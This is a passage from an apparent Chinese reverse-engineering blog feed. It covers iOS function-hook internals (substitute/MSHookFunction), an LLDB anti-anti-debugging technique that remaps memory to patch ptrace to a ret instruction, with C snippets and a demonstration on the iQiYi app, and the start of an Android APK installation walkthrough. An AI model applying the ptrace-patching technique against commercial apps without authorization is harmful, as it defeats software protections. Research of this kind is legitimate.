0x000000017ff04040(lldb) x/5g 0x000000017ff040400x17ff04040: 0x0000000000000000 0x0000000104a3fba4</code></pre><p>这里计算出来<code>X16=0 X17=0x0000000104a3fba4</code>所以这里会跳转到<code>0x0000000104a3fba4</code>这个地址。等下！这个地址不就是new_ZTL7624417887的地址吗，这样进过两次跳转就跳到了我们写的hook函数了，完成了对原函数的hook。下面再分析如何又执行原函数，分析original_ZTL7624417887函数数据</p><pre><code>(lldb) x/12i 0x0000000104a53fe8    0x104a53fe8: 0xd2800008   mov    x8, #0x0    0x104a53fec: 0x580000e9   ldr    x9, #0x1c    0x104a53ff0: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x104a53ff4: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x104a53ff8: 0x58000050   ldr    x16, #0x8    0x104a53ffc: 0xd61f0200   br     x16    0x104a54000: 0x00f52078   .long  0x00f52078                ; unknown opcode    0x104a54004: 0x00000001   .long  0x00000001                ; unknown opcode</code></pre><p>从上面可以发现前四条指令正是原函数new_ZTL7624417887的前四条指令等价指令，然后再进行跳转</p><pre><code>0x104a53ff8: 0x58000050   ldr    x16, #0x80x104a53ffc: 0xd61f0200   br     x160x104a54000: 0x00f52078   .long  0x00f52078                ; unknown opcode0x104a54004: 0x00000001   .long  0x00000001                ; unknown opcode(lldb) x/g 0x104a540000x104a54000: 0x0000000100f52078</code></pre><p>这里跳转的地址就是原函数new_ZTL7624417887的第五条指令地址，这样整个调用原函数的过程就结束了。</p><h4 id="MSHookFunction如何解决内存patch的问题"><a href="#MSHookFunction如何解决内存patch的问题" class="headerlink" title="MSHookFunction如何解决内存patch的问题"></a>MSHookFunction如何解决内存patch的问题</h4><p>由于<code>substitute</code>开源的，所以可以结合源码分析。源码在<a href="https://github.com/coolstar/substitute">这里</a></p><p><code>SubHookFunction</code>函数伪代码，此时的函数参数为</p><pre><code>x0 = 0x00000001005de068  Filza`ZTL7624417887x1 = 0x0000000102c9bbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19x2 = 0x0000000102c9c148  xkfilza.dylib`original_ZTL7624417887</code></pre><p>就是原函数地址，替换的函数地址，保存原函数地址的指针</p><pre><code class="c">__int64 __fastcall SubHookFunction(__int64 a1, __int64 a2, __int64 a3){  __int64 result; // x0  FILE *v4; // x19  __int64 v5; // ST00_8  __int64 v6; // [xsp+10h] [xbp-30h]  __int64 v7; // [xsp+18h] [xbp-28h]  __int64 v8; // [xsp+20h] [xbp-20h]  int v9; // [xsp+28h] [xbp-18h]  v6 = a1;  v7 = a2;  v8 = a3;  v9 = 0;  result = substitute_hook_functions((__int64)&amp;v6, 1uLL, 0LL, 1);  if ( (_DWORD)result )  {    v4 = __stderrp;    v5 = substitute_strerror();    fprintf(v4, &quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;, v5);    abort();  }  return result;}</code></pre><p>对应源码<code>substitute/lib/darwin/substrate-compat.c</code></p><pre><code class="c">void SubHookFunction(void *symbol, void *replace, void **result)    __asm__(&quot;SubHookFunction&quot;);void SubHookFunction(void *symbol, void *replace, void **result) {    struct substitute_function_hook hook = {symbol, replace, result};    int ret = substitute_hook_functions(&amp;hook, 1, NULL,                                        SUBSTITUTE_NO_THREAD_SAFETY);    if (ret) {        substitute_panic(&quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;,                         substitute_strerror(ret));    }}</code></pre><p>再跟一下到<code>substitute_hook_functions</code>函数。</p><p>对应源码<code>substitute/lib/hook-functions.c</code></p><p>还在分析中…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/coolstar/electra/issues/233">https://github.com/coolstar/electra/issues/233</a></li><li><a href="https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary">https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary</a></li><li><a href="https://github.com/ipasimulator/lldb">https://github.com/ipasimulator/lldb</a></li><li><a href="https://github.com/BishopFox/bfinject">https://github.com/BishopFox/bfinject</a></li><li><a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a></li><li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf" target="_blank" rel="external">http://www.newosxbook.com/articles/CodeSigning.pdf</a></li><li><a href="https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b">https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b</a></li><li><a href="https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md">https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md</a></li><li><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS12内存patch-remap-bug分析&quot;&gt;&lt;a href=&quot;#iOS12内存patch-remap-bug分析&quot; class=&quot;headerlink&quot; title=&quot;iOS12内存patch remap bug分析&quot;&gt;&lt;/a&gt;iOS12内存patch r
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="hook" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>iOS LLDB中反反调试分析与实现</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/</id>
    <published>2019-08-12T11:16:01.000Z</published>
    <updated>2019-08-13T17:41:50.131Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS-LLDB中反反调试分析与实现"><a href="#iOS-LLDB中反反调试分析与实现" class="headerlink" title="iOS LLDB中反反调试分析与实现"></a>iOS LLDB中反反调试分析与实现</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。</p><h4 id="目前反调试与反反调试情况"><a href="#目前反调试与反反调试情况" class="headerlink" title="目前反调试与反反调试情况"></a>目前反调试与反反调试情况</h4><p>这里庆哥写了一遍文章分析了 <a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p><p>这里简单归纳一下，有如下几种：</p><ul><li>ptrace</li><li>sysctl</li><li>syscall</li><li>SIGTOP</li><li>task_get_exception_ports</li></ul><p>这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。</p><p>后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（<del>差点以为白做了）</del></p><p>正如文章里面写到通过<code>lldb</code>下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。</p><h4 id="内存patch实现反反调试"><a href="#内存patch实现反反调试" class="headerlink" title="内存patch实现反反调试"></a>内存patch实现反反调试</h4><p>说一下大概思路：</p><ul><li>内存中找到<code>ptrace</code>地址</li><li>将该内存map为<code>rwx</code></li><li><p>直接将首调指令修改为<code>ret</code>指令</p><p>刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。</p></li></ul><p>由于iOS不允许直接将代码段map为写权限，这里调用<code>mach_vm_protect</code>或<code>mprotect</code>都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。</p><p>大致的流程如下：</p><ul><li>使用mmap新建一块内存，把这块内存叫做new</li><li>使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里</li><li>向new里写入想执行的代码</li><li>调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题</li><li>调用mach_vm_remap把new的内容反映回target里</li></ul><p>不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。</p><p>期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用<code>memory region</code>查看地址才知道页保护属性为<code>rw</code>。</p><p>相关代码如下：</p><p>1、map new page for patch</p><pre><code class="c">    // map new page for patch    void *new = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);    if (!new ){        NSLog(@&quot;[-] mmap failed!&quot;);        return;    }    NSLog(@&quot;[*] new map address:%p&quot;, new);</code></pre><p>2、start patch</p><pre><code class="c">    // start patch        kret = vm_copy(self_task, (unsigned long)page_start, 0x1000, (vm_address_t) new);    if (kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret     memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4);    NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset));</code></pre><p>3、set new page back to r-x</p><pre><code class="c">    // set back to r-x    int ret = mprotect(new, 0x1000, PROT_READ | PROT_EXEC);    NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new);</code></pre><p>4、remap the target page</p><pre><code class="c">    kret = mach_vm_remap(mach_task_self(), &amp;target, 0x1000, 0,                       VM_FLAGS_OVERWRITE, self_task,                       (mach_vm_address_t) new, TRUE,                       &amp;c, &amp;m, inherit);    if(kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr)</code></pre><p>5、clear cache</p><pre><code class="c">    void* clear_start_ = (void*)page_start + patch_offset;  sys_icache_invalidate (clear_start_, 4);  sys_dcache_flush (clear_start_, 4);</code></pre><p>完整的代码在xia0LLDB里面已经集成：<a href="https://github.com/4ch12dy/xia0LLDB">https://github.com/4ch12dy/xia0LLDB</a></p><h4 id="一个简单反反调试实验"><a href="#一个简单反反调试实验" class="headerlink" title="一个简单反反调试实验"></a>一个简单反反调试实验</h4><p>这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。</p><ul><li><p>后台启动方式启动爱奇艺</p><pre><code class="shell">xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo[I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo</code></pre></li><li><p>LLDB挂上以后在main函数下断点以后直接执行<code>debugme</code>命令</p><pre><code>(lldb) debugmeKill antiDebug by xia0:[*] ptrace target address: 0x1837dc180 and offset: 0x180[*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page.[+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy[*] set new page back to r-x success![*] get page info done.[+] remap to target success![*] clear cache success![+] all done! happy debug~</code></pre><p>下面查看对比下patch前后指令ptrace首指令的变化</p><p>Patch之前</p><pre><code>(lldb) x/12i 0x00000001837dc180    0x1837dc180: 0xf00f26a9   adrp   x9, 124119    0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>Patch之后</p><pre><code>(lldb) x/12i 0x1837dc180    0x1837dc180: 0xd65f03c0   ret        0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>可以发现首地址已经变成了ret指令。</p></li><li><p>执行continue命令，发现爱奇艺已经能够正常调试。</p><pre><code>(lldb) cProcess 3176 resuming2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:]2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39;2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred.2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred.3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future.ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite</code></pre></li></ul><h4 id="总结-Todo"><a href="#总结-Todo" class="headerlink" title="总结/Todo"></a>总结/Todo</h4><p>这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。</p><h4 id="参考-致谢"><a href="#参考-致谢" class="headerlink" title="参考/致谢"></a>参考/致谢</h4><ul><li><p><a href="https://gist.github.com/piaoger/4ba83f6a954bca113505" target="_blank" rel="external">https://gist.github.com/piaoger/4ba83f6a954bca113505</a></p></li><li><p><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></p></li><li><p><a href="https://www.codercto.com/a/63507.html" target="_blank" rel="external">https://www.codercto.com/a/63507.html</a></p></li><li><p><a href="https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26">https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26</a></p></li><li><p><a href="https://github.com/gdbinit/readmem/blob/master/readmem/main.c">https://github.com/gdbinit/readmem/blob/master/readmem/main.c</a></p></li><li><p><a href="https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h">https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h</a></p></li><li><p><a href="http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c" target="_blank" rel="external">http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c</a></p></li><li><p><a href="https://github.com/DaKnOb/memscan/blob/master/main.mm">https://github.com/DaKnOb/memscan/blob/master/main.mm</a></p></li><li><p><a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">http://iosre.com/t/topic/8179</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS-LLDB中反反调试分析与实现&quot;&gt;&lt;a href=&quot;#iOS-LLDB中反反调试分析与实现&quot; class=&quot;headerlink&quot; title=&quot;iOS LLDB中反反调试分析与实现&quot;&gt;&lt;/a&gt;iOS LLDB中反反调试分析与实现&lt;/h3&gt;&lt;h4 id=&quot;开
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 